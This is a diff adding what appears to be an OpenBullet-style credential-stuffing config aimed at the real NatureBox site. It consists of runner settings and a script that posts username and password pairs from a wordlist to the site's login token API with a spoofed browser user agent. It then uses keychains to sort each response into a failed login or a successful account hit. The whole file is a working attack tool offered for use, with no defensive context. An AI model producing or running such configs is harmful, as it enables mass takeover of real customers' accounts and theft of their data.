@@ -1,0 +1,41 @@
+[SETTINGS]
+{
+  "Name": "NatureBox",
+  "SuggestedBots": 1,
+  "LastModified": "2018-08-22T06:55:42.831178+00:00",
+  "AdditionalInfo": "",
+  "Author": "boggy94",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#POST REQUEST POST "https://naturebox.com/ipa/v2/membership/tokens" AutoRedirect=TRUE 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"grant_type\":\"password\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://naturebox.com" 
+  HEADER "referer: https://naturebox.com/signin?location=account" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username and password combination" 
+    KEY "\"errors\":{\"" 
+    KEY "\",\"code\":401" 
+  KEYCHAIN Success OR 
+    KEY "user_id" 
+    KEY "scope" 
